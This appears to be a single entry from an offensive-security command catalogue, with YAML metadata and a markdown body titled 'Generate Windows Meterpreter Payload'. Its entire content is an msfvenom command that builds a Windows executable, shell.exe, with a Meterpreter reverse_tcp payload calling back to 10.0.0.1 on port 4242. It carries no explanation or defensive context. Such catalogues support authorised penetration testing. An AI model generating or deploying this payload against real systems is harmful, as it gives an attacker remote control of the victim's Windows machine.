---
id: 4bed3964-fe9e-4cc4-8660-ef3dba731b65
name: Generate Windows Meterpreter Payload
type: command
executor: bash
data: $ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f
  exe > shell.exe
output: null
created_at: '2023-04-06T03:56:24.923390+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
---

# Generate Windows Meterpreter Payload

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
```


